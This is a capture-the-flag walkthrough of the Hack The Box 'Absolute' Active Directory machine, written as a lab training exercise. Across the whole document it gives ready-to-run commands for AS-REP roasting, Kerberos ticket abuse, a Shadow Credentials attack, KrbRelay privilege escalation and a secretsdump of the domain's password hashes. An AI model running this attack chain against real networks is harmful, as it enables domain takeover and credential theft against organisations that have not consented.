---
date: 2025-03-30
categories: [CTF, HTB]
title: "HTB - Absolute"
tags: ['bloodhound', 'hashcat', 'impacket', 'kerberos', 'ldap', 'linux', 'nmap', 'privilege escalation', 'python', 'rce', 'secretsdump', 'smb', 'windows']

description: "Absolute - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Absolute

NMAP

![image1](../resources/479889a0306242c18e308a6dfa0a8bae.png)

Add **absolute.htb** to /etc/hosts
Add **dc.absolute.htb** to /etc/hosts


- We can download all the images and check if they have Author names attached to them:

```bash
exiftool hero* | grep "Author"

```

![image2](../resources/f316bcce23fc45dd9421fe55b39c80b4.png)

- Try and find potential domain usernames by rearranging the found names, with this python script:

```python
#!/usr/bin/env python3
import sys

def generate_username(name, surname):
    first = name[0].lower()
    last = surname[0].lower()
    username_options = [
        name,
        surname,
        first + '.' + surname,
        first + surname,
        name + last,
        name + '.' + last,
        name + '.' + surname,
        name + '_' + surname,
        first + '_' + surname,
        name + '_' + last,
        first + '-' + surname,
        name + '-' + last,
        last + '-' + name
    ]
    return username_options

if len(sys.argv) < 2:
    print("Usage: python script.py <input_file>")
    sys.exit(1)

infile = sys.argv[1]
with open(infile, "r") as file:
    lines = file.readlines()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        temp = line.split()
        name = temp[0].lower()
        surname = ' '.join(temp[1:]).lower()
        usernames = generate_username(name, surname)
        for username in usernames:
            print(username)

```

![image3](../resources/dbdd55ffe1af486ab541325c988cfd16.png)

```bash
./kerbrute -v userenum -d absolute.htb --dc absolute.htb potentials | grep "VALID"

```

![image4](../resources/44202a2b62fc491f999a72fa8f2d34af.png)

```bash
cat valid_users | cut -d ":" -f 4 | cut -d " " -f 2

```

![image5](../resources/d8c2d952b8c04845ba1ff197d84a3af4.png)

```bash
impacket-GetNPUsers absolute.htb/ -users valid_users.txt -no-pass -dc-ip absolute.htb

```

![image6](../resources/5f2f90e2eb644a2d92ed78549f35baa5.png)

```bash
hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

![image7](../resources/311d35e26bb140239395629818e511f4.png)

**d.klay : Darkmoonsky248girl**

- Nothing useful can be done with the credentials:

![image8](../resources/ec6d893c9f244af39821f75327cb89d4.png)

SMB does however gives an interesting error:

**STATUS_ACCOUNT_RESTRICTION**

- The account is restricted

![image9](../resources/a2a0aded054c427aa23333ef5df36f78.png)

- It doesn't say LOGON FAILURE but rather, accessing it through this method is restricted
So to bypass the restrictions we can try and authenticate with a valid TGT for the user:

```bash
impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl'

```

![image10](../resources/abbf03e47ad5423aa3b9017b70196d7a.png)

```bash
export KRB5CCNAME=d.klay.ccache

```

![image11](../resources/0697758d8d714dc6a204db42f1e94a3c.png)

Error: KRB_AP_ERR_SKEW


![image12](../resources/8145238b922444968f523e5ed2309d3c.png)

```bash
sudo ntpdate -u dc.absolute.htb && sudo hwclock --systohc

```

![image13](../resources/19e86cb6d01d48228bd09d1e4b33cdd7.png)

```bash
crackmapexec smb dc.absolute.htb --use-kcache --shares

```

![image14](../resources/3d27e948f1df42e0b81184dee0a9bed9.png)

- We need to use impacket's SMB client because it supports Kerberos authentication:

```bash
impacket-smbclient -k dc.absolute.htb

```

![image15](../resources/312ec966690c4da3927b03a3243f64d2.png)

But we can't access the share:


![image16](../resources/50e74de74bd3425c862b125a4c4a957e.png)

- We have ldap access as well - so we can list all users:

```bash
crackmapexec ldap dc.absolute.htb --use-kcache --users

```

![image17](../resources/d2191b6d5d8748a58dbf1ae9e60590b3.png)

- And we get credentials in the description:
**svc_smb : AbsoluteSMBService123!**

- We can try them with SMB:

![image18](../resources/09fe1c205741484993b17f2b556d900e.png)

- Get a TGT for the svc_smb:

```bash
impacket-getTGT 'absolute.htb/svc_smb:AbsoluteSMBService123!'

```

![image19](../resources/72990e315ff544ec82d0bed76a64ba4f.png)

```bash
export KRB5CCNAME=svc_smb.ccache

```

![image20](../resources/ec96b96bde66474e8583f35fa690b57a.png)

```bash
impacket-smbclient -k dc.absolute.htb

```

![image21](../resources/88ae850589bf47b7b3c5d3262a19677f.png)

And we get can access the Shared folder.

Download the files.

- Open a Windows VM and run test.exe
**Nothing happens**

- I ran it again and opened it in API Monitor

- Searching for the domain name "absolute" - we can see a few things:

It is using the name **mlovegod** to authenticate to the DC's LDAP service.

It looks like the password is encoded.


![image22](../resources/bc325acbd07b44bcb37d6e9c24a10009.png)

CyberChef couldn't decrypt it


![image23](../resources/1aaa05b000624807aaa52012f4a64f7d.png)

- On the Windows VM, install the Openvpn GUI, upload test.exe and install Wireshark to capture the traffic
- Disconnect the Openvpn connection on Kali
- Copy your openvpn profile .ovpn file to the Windows machine

- Run the ovpn profile so it connects

![image24](../resources/166e9a06595942679005de90be7a02a9.png)

- Add the IP and dc.absolute.htb to **C:\Windows\System32\drivers\etc\hosts**
(Open in admin terminal and run notepad)


![image25](../resources/38a7ebf151984a73a83356c8d92838d1.png)

- With Wireshark capturing on all interfaces - run test.exe:

![image26](../resources/c84fa1fa807045859bac75e9069f8f75.png)

- Follow the TCP Stream from the LDAP:

![image27](../resources/ce529d995e46423e939de6ee5abf7751.png)

- We get the credentials:
**mlovegod : AbsoluteLDAP2022!**

Doesn't work:


![image28](../resources/5f93a229903c4f5e9672466141d0106f.png)

But if we change the format of the username, as seen in the ldap users dump, to m.lovegod:


![image29](../resources/6cea0ad5a7904c0b8a1d8d5af35542c5.png)

- Get a TGT for m.lovegod:

```bash
impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'

```

![image30](../resources/5d44015bfb904dbb8f05bcfdabc765e2.png)

```bash
export KRB5CCNAME=m.lovegod.ccache

```

![image31](../resources/1a116bb49f384c6b87de05ca66f9c4a4.png)

- We can't evil-winrm in

- But using the TGT we can run bloodhound remotely:

```bash
bloodhound-python -k -c all -d absolute.htb -ns 10.129.229.59 -dc dc.absolute.htb -no-pass -u m.lovegod

```

![image32](../resources/ae852950bf504a1992f23418f5a091eb.png)

**\*\*The new bloodhound showed nothing but the old bloodhound version shows an escalation path**

- M.lovegod owns Network Audit group that has GenericWrite over winrm_user that can PSRemote to the machine (DC)
Also, both m.lovegod and winrm_user are in Protected Users group:


![image33](../resources/f5e32ecfa7eb4e5ea89a88d8d23566c0.png)


![image34](../resources/a462c3e207b54e96b0721417c5e70bb8.png)


![image35](../resources/32e6556256cc46fba2d77d5c92104aa6.png)

In kerberos, pre-authentication is needed to be done in order for KDC to make sure that you have credentials for the account, without pre-auth, anyone can get encrypted password and crack it offline (perform ASREP-Roast).

**Pre-auth** can be done in two ways:
- **symmetric/secret key** which is the most common one
- **asymmetric/public key** that uses **certificates** which are called **PKINIT**

Since m.lovegod (as a member of Network Audit group) have a GenericWrite over winrm_user that means we can modify its attribute called **msDS-KeyCredentialLink**.

The attribute itself stores client’s public key and a bunch of other data in serialized format. So **if we can write to the attribute**, that means we can **obtain a valid TGT** for that account. That attack/technique is called **Shadow Credentials**

<u>Steps:</u>
1.  Give m.lovegod the permissions/ACL for the Network Audit group
2.  Add m.lovegod to the group
3.  Perform Shadow Credentials attack on winrm_user and finally get his TGT

**<u>Step 1 - DACL edit - Give user Full Control</u>**

Because we have **'owns' permission** for Network Audit **but we are not members of it yet**, lets grant us all permissions for that group by adding ACL for m.lovegod using impacket-dacledit

<https://www.thehacker.recipes/a-d/movement/dacl/grant-rights>

<https://github.com/ShutdownRepo/impacket/tree/dacledit>

(Could be done with bloodyAD but the -k option doesn't want to work

```bash
./bloodyAD.py --host "10.129.229.59" -d "absolute.htb" -u "m.lovegod" -p "AbsoluteLDAP2022!" add genericAll 'Network Audit' 'm.lovegod'
```

- Download the zip file from the repo above
- Unzip and cd into the folder and into examples
- cp dacledit.py up one folder
- Run pip install -r requirements.txt

- Export the KRB env variable to the FULL path

![image36](../resources/589099a6888349bb85b01cb53468051a.png)

- If we try and read the ACL's that m.lovegod has over the group - There aren't any:

```bash
./dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action read -principal 'm.lovegod' -target 'Network Audit'

```

![image37](../resources/641b0c1362db476780c59207e3337831.png)

- Run dacledit.py and change read for write:

```bash
./dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action **write** -principal 'm.lovegod' -target 'Network Audit'

```

![image38](../resources/e544c430c50a499e92ad6adde73fe23d.png)

- Now when we read it, we can see that we have FullControl:

![image39](../resources/0ff4fcc4ff4942fca35772293a86f421.png)

- The ACL gets removed after a short amount of time

**<u>Step 2 - Add user to group - net rpc</u>**

Now that we have Full Control over the group Network Audit - We can add ourselves to the group

<https://www.thehacker.recipes/a-d/movement/dacl/addmember>


![image40](../resources/8e4082eeff1443b5a3b80345cf458c04.png)

- Using the net rpc command - we can add the user to the group:

```bash
net rpc group addmem "Network Audit" 'm.lovegod' -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb

```
But we get an error


![image41](../resources/96b3a087a86746f7b3bfcafda938d796.png)

**<u>Kerberos fix:</u>**
- Make sure the Linux Kerberos library is installed:

```bash
sudo apt install krb5-user

```
- Export the KRB env variable to the FULL path

![image36](../resources/589099a6888349bb85b01cb53468051a.png)

- cp /etc/krb5.conf /etc/krb5.conf.bak

- Edit **/etc/krb5.conf** - so it reflects this: (The krb5.conf file isn't used by impacket but most other apps do use it)

![image42](../resources/c0200d68470a48dab941f3826530c4d3.png)

- Edit **/etc/resolv.conf** - so it reflects this (DC IP):
Adding dc.absolute.htb as a DNS server


![image43](../resources/1bc81fd75885487e99550378642eb926.png)

- And **/etc/hosts**:

![image44](../resources/6db3968bac9049d8aab27f62bcf0e7f1.png)

- Kinit will still show this - but it means we can connect to the KDC now:

![image45](../resources/cf08942530b34e66a28136cc29a03de2.png)

- Because the ACL's get removed, we need to do everything in quick succession:

```bash
python3 dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action write -principal 'm.lovegod' -target 'Network Audit' && python3 dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action read -principal 'm.lovegod' -target 'Network Audit' && **net rpc group addmem "Network Audit" 'm.lovegod' -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb**

```

![image46](../resources/9621bad15b734444a47aca43ab835103.png)

- And then we can check the group members to be sure:

```bash
net rpc group members "Network Audit" -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb

```

![image47](../resources/5d69b03818e44e22a4d811d92498e887.png)

Now we are member of Network Audit, we need to get a new TGT for m.lovegod and export it, because the permissions we granted to m.lovegod are not applied to TGT we currently have

```bash
impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'

```

![image48](../resources/a514bd4441aa45b8bb9980d77d0ee497.png)

```bash
export KRB5CCNAME=/home/hokage/HTB/Absolute/m.lovegod.ccache

```

![image49](../resources/ba69f46549ed48259cf9298f44a208d0.png)

**<u>Step 3 - Shadow credentials - Winrm_user</u>**

<u>Option 1 - Certipy:</u>

- At this point, we should have GenericWrite over the winrm_user , so we first check if ADCS is installed, using certipy:

```bash
certipy find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb

```

![image50](../resources/8baea85a585c41f9991b0890c714a607.png)

- It seems like ADCS is indeed installed on the system. Since we have GenericWrite and ADCS is installed, we can overwrite the **msDS-KeyCredentialLink** attribute of **winrm_user**, which is vital for the shadow credential attack, and get a TGT for this user.

```bash
certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb -account winrm_user

```

![image51](../resources/3be402a63d0142db9124527e6d9f0a2f.png)

We get the hash and the Kerberos ccache file but because winrm_user is in the Protected Users group, we can't use the hash

```bash
export KRB5CCNAME=winrm_user.ccache

```

![image52](../resources/71dc8cbf5a1e476aadd98c02798d32df.png)

- Evil-winrm automatically uses Kerberos ticket if no credentials are supplied
Evil-winrm uses the /etc/krb5.conf file so make sure ABSOLUTE.HTB is added (as per the previous screenshot)

```bash
evil-winrm -i dc.absolute.htb -r absolute.htb

```

![image53](../resources/5eda2fc410ea4d29955d98693121d92f.png)

<u>Option 2 - pywhisker:</u>

- Pywhisker is a remote version of Whisker.exe written in python.
It will get us a PFX Certificate for PKINIT Kerberos authentication and a password for it

<https://github.com/ShutdownRepo/pywhisker>

```bash
python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k -t "winrm_user" --action "add" --dc-ip 10.129.229.59

```

![image54](../resources/1d5501e40efc4526b6ce33ca33c2f4bc.png)

- If you get the error:

![image55](../resources/52f8bcfafa1042a3be71aa2c34f265e9.png)
- Downgrade OpenSSL:

```bash
pip install pyOpenSSL 23.0.0

```
- Now using PKINIT Tools, we can get a TGT from the PFX certificate using gettgtpkinit.py:
<https://github.com/dirkjanm/PKINITtools/tree/master>

```bash
python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx WmEE6V3q.pfx -pfx-pass LHDludLCpgVu8rQCbDAF winrm_user.ccache

```

![image56](../resources/0f7f9255f7454147a336f348a24528ea.png)

```bash
export KRB5CCNAME=winrm_user.ccache

```

![image57](../resources/4fa3ddf45cbc4db4bfaf396612e431b0.png)

- Evil-winrm automatically uses Kerberos ticket if no credentials are supplied
Evil-winrm uses the /etc/krb5.conf file so make sure ABSOLUTE.HTB is added (as per the previous screenshot)

```bash
evil-winrm -i dc.absolute.htb -r absolute.htb

```

![image58](../resources/4c1648ff65a64ac39ba67ad9fc66a1b6.png)

**<u>Priv Esc - KrbRelay - Option 1</u>**

Enumerating the remote machine, we quickly come to notice that everything seems to be standard and patched.

But we did deal a lot with Kerberos in the foothold phase.

KrbRelay works on default Windows installations, in which **LDAP signing is disabled**

<https://github.com/cube0x0/KrbRelay>

- Open the .sln file and build the two .exe files, so you have:
CheckPort.exe

KrbRelay.exe

Or use already built repo:

<https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any>

- First we execute CheckPort.exe, to find available ports for the OXID resolver to run

![image59](../resources/7371b63a71ea445c9063af01d732df38.png)

<https://thrysoee.dk/InsideCOM+/ch19f.htm>


![image60](../resources/5393db6cff5f4a359d6615a541bd130a.png)

**Port 10 is open**

- Then, we need to find a CLSID to specify the service that KrbRelay is going to run in.
The CLSIDs vary among Windows versions, but we can typically use the default ones like the CLSID of TrustedInstaller:

**8F5DF053-3013-4dd8-B5F4-88214E81C0CF**


![image61](../resources/ab3c8cbaa2a2472abc14bf9a7eb854dd.png)

<u>Get more CLSIDs:</u>
- This tool can enumerate for more valid CLSIDs
<https://github.com/tyranid/oleviewdotnet>

- Or the KrbRelay Github has some in the examples:
<https://github.com/cube0x0/KrbRelay>

- Or JuicyPotato GitHub:
<https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise>

```bash
.\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10
```

![image62](../resources/1b751283f29a4823abd1c5c646382e5e.png)

We get the error Access Denied.

**KrbRelay needs an interactive session**, a console, on the machine.

During an interactive session, the **credentials** for the user are stored **in memory**.

Unfortunately, this is not the case when using PS remoting to access the machine.

- Test with **qwinsta** - as it requires an interactive session to run

![image63](../resources/486300af49e847cda52c2cde96bb19c5.png)

We can see that there are no interactive sessions

<https://cybersafe.co.il/wp-content/uploads/2021/11/LOGON-types-compressed_compressed.pdf>


![image64](../resources/a569da4a063341d3ab02b1bca050b5a7.png)

<u>Create a session with RunasCs:</u>

Logon type 9 is our best option at this point because we will authenticate over the network as another user, with any password we want, while we run the application locally as ourselves

- Test with the "qwinsta" command:

```bash
.\runascs.exe winrm_user -d absolute.htb **MadeUpPassword** -l 9 "qwinsta"

```

![image65](../resources/c2f4ec2dfc3540a39252387f0a187064.png)

- Re-run KrbRelay through RunasCs:

```bash
.\runascs.exe winrm_user -d absolute.htb MadeUpPassword -l 9 "C:\users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10"

```

![image66](../resources/628441bfee2b4d878c67ea05d00677db.png)

LDAP session established successfully

- Now add the winrm_user to the Administrators group:

```bash
.\runascs.exe winrm_user -d absolute.htb MadeUpPassword -l 9 "C:\users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"

```

![image67](../resources/4e4cfc78d78a493e9be291765f17ced3.png)

- Check with:

```bash
net user winrm_user

```

![image68](../resources/d163d0d16e8c4060a76df255cb4583c9.png)

```bash
cat root.txt

```
**<u>Priv Esc - KrbRelayUp - Option 2</u>**

```bash
.\RunasCs.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Users\winrm_user\Documents\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"

```

![image69](../resources/c531aa3a5830493ca9d9dc9bed7a02e0.png)

```bash
.\Rubeus.exe asktgt /user:DC$ /certificate:<certificate(ce text)> /password:"oH0/mS2@rD4#" /getcredentials /show /nowrap

```

![image70](../resources/bbecd5082a9944b09f0b813cd86f6a09.png)


![image71](../resources/e1c02e33666b4095b402c98d7fc6d202.png)

Got DC\$ hash - A7864AB463177ACB9AEC553F18F42577

- <u>Dump hashes:</u>

```bash
impacket-secretsdump -hashes :A7864AB463177ACB9AEC553F18F42577 'absolute.htb/dc$@dc.absolute.htb'

```

![image72](../resources/f68e166d6f9b4f939f9f7914254fd763.png)

```bash
crackmapexec smb absolute.htb -u DC$ -H :A7864AB463177ACB9AEC553F18F42577 --ntds

```

![image73](../resources/85888a46043f4d55a50f63ae299fa0a9.png)

```bash
evil-winrm -i dc.absolute.htb -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea

```

![image74](../resources/9134f3f957004b2a97130008da6b7526.png)